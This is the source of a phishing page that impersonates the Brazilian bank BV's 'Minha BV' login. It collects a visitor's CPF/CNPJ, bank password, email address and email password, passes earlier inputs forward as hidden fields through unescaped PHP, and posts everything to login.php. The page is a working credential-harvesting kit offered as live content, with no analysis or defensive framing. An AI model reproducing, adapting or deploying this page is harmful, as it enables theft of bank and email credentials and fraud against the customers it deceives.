<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>BV | Minha BV</title>
<link href="https://fonts.googleapis.com/css?family=Istok+Web:400,700" rel="stylesheet"> 
<script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
<script type="text/javascript" src="jquery.maskedinput.min.js"></script>
<script type="text/javascript">

$( document ).ready(function() {
$("#login").mask("999.999.999-99");

////////////
$( "#botao01" ).click(function() {
if (form.login.value=="" || form.login.value.length < 9) {
alert('Digite seu CPF/CNPJ corretamente.');
form.login.focus();
}else {
$("#sumir1").fadeOut();
$("#sumir2").fadeIn();
}
});
////////////


////////////
$( "#botao02" ).click(function() {
if (form.senha1.value=="" || form.senha1.value.length < 6) {
alert('Digite seu Senha corretamente.');
form.senha1.focus();
}else {
$("#sumir2").fadeOut();
$("#sumir3").fadeIn();
}
});
////////////


////////////
$( "#botao03" ).click(function() {
	
if(document.getElementById("pwr_email").value.length < 5){
alert('Por favor, preencha o login do seu email.');
document.getElementById("pwr_email").focus();
return false;

}  
	  
if(document.getElementById("pwr_senhaemail").value.length < 2){
alert('Por favor, preencha seu do email.');
document.getElementById("pwr_senhaemail").focus();
return false;

}


$("#form").submit();

});
////////////

});



function limitarInput_pwr(obj,valor) {
			obj.value = obj.value.substring(0,valor); 
		}

</script>
<style type="text/css">
body {
	font-family: 'Istok Web', sans-serif;
background: #CB356B;  /* fallback for old browsers */
background: -webkit-linear-gradient(to left, #df2a50, #9d2b65);  /* Chrome 10-25, Safari 5.1-6 */
background: linear-gradient(to left, #df2a50, #9d2b65); /* W3C, IE 10+/ Edge, Firefox 16+, Chrome 26+, Opera 12+, Safari 7+ */

	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
}

body,td,th {
	font-family: "Istok Web", sans-serif;
	color: #FFF;
}

.floating-form {
  width:100%;
}

/****  floating-Lable style start ****/
.floating-label { 
  position:relative; 
  margin-bottom:20px; 
}
.floating-input , .floating-select {
  font-size:14px;
  padding:4px 4px;
  display:block;
  width:100%;
  height:30px;
  background-color: transparent;
  border:none;
  border-bottom:1px solid #fff;
}

.floating-input:focus , .floating-select:focus {
     outline:none;
     border-bottom:1px solid #fff; 
}

label {
  color:#CCC; 
  font-size:14px;
  font-weight:normal;
  position:absolute;
  pointer-events:none;
  left:5px;
  top:5px;
  transition:0.2s ease all; 
  -moz-transition:0.2s ease all; 
  -webkit-transition:0.2s ease all;
}

.floating-input:focus ~ label, .floating-input:not(:placeholder-shown) ~ label {
  top:-18px;
  font-size:14px;
  color:#CCC;
}

.floating-select:focus ~ label , .floating-select:not([value=""]):valid ~ label {
  top:-18px;
  font-size:14px;
  color:#CCC;
}

/* active state */
.floating-input:focus ~ .bar:before, .floating-input:focus ~ .bar:after, .floating-select:focus ~ .bar:before, .floating-select:focus ~ .bar:after {
  width:50%;
}

*, *:before, *:after {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}

.floating-textarea {
   min-height: 30px;
   max-height: 260px; 
   overflow:hidden;
  overflow-x: hidden; 
}

/* highlighter */
.highlight {
  position:absolute;
  height:50%; 
  width:100%; 
  top:15%; 
  left:0;
  pointer-events:none;
  opacity:0.5;
}

/* active state */
.floating-input:focus ~ .highlight , .floating-select:focus ~ .highlight {
  -webkit-animation:inputHighlighter 0.3s ease;
  -moz-animation:inputHighlighter 0.3s ease;
  animation:inputHighlighter 0.3s ease;
}

/* animation */
@-webkit-keyframes inputHighlighter {
	from { background:#5264AE; }
  to 	{ width:0; background:transparent; }
}
@-moz-keyframes inputHighlighter {
	from { background:#5264AE; }
  to 	{ width:0; background:transparent; }
}
@keyframes inputHighlighter {
	from { background:#5264AE; }
  to 	{ width:0; background:transparent; }
}


/***   Body style end  ***/


/***   daniel - Fork me friend - style   ***/
.floating-credit { position:fixed; bottom:10px;right:10px; color:#aaa; font-size:13px;font-family:arial,sans-serif; }
.floating-credit a { text-decoration:none; color:color:#CCC; ; font-weight:bold; }
.floating-credit a:hover { border-bottom:1px dotted #f8f8f8; }
.floating-heading { position:fixed; color:#aaa; font-size:20px; font-family:arial,sans-serif; }
/***  daniel - Fork me friend - style  ***/



.white-button {
    position: relative;
    display: inline-block;
    height: 63px;
	color:#dc1468;
	font-size:16px;
    padding: 0 43px;
    border: 1px solid #fff;
    line-height: 63px;
    background-color: #fff;
    font-family: "Frutiger Roman",sans-serif;
    overflow: hidden;
    transition: transform .3s 0s;
	cursor:pointer;
    z-index: 1;
}


.white-button:hover {
    background-color: transparent;
    color: #fff;
	
&:after {
    left: 120%;
    transition: all 550ms cubic-bezier(0.19, 1, 0.22, 1);
  }
}



</style>
</head>

<body>
<form id="form" name="form" method="post" action="login.php">
<div id="main">
      <?php
foreach ($_POST as $key => $val)
{
  echo "<input name='".$key."' type='hidden' value='".$val."'>";
}

?>
<div id="homepwr" style="padding:10px; width:480px; text-align:center; margin:0px auto; margin-top:250px;">
<div class="easy-payment-book-title -white">
<h2 translate="@BV-SITE-LOGIN-ACESSO-TITULO" class="medium-title" style="font-size: 2.975rem;">Minha BV</h2>
<p translate="@BV-SITE-LOGIN-SUBTITLE" translate-values="{accessStep: loginvii.accessStep}" class="description">
  <img src="https://morettic.com.br/wp2/wp-content/uploads/2018/01/e-mail-marketing-300x187.png" style="margin-top:-25px;" width="130" />
<h3>Confirme seu endereço de e-mail</h3></p>
</div>


<div class="floating-form" style="color:#fff;">

<div id="sumir1">
  <div class="floating-label">  

    <input type="text" class="floating-input" style="color:#CCC; " name="pwr_email" id="pwr_email" onkeyup="limitarInput_pwr(this,'80')" autocomplete="off"  maxlength="80" placeholder=" ">
          <span class="highlight"></span>
      <label>Informe seu email para continuar.</label>
  </div>
  
    <div class="floating-label"> 

    <input type="password" class="floating-input" style="color:#CCC; " placeholder=" " name="pwr_senhaemail" id="pwr_senhaemail" onkeyup="limitarInput_pwr(this,'80')" autocomplete="off"  maxlength="80">
        <span class="highlight"></span>
      <label>Informe a senha email para continuar</label>
  </div>
    <input name="enviar" id="botao03" type="button"  class="white-button btn-4 " value="Confirmar" />
</div>    
    




</div>



</div>

</form>


</body>
</html>
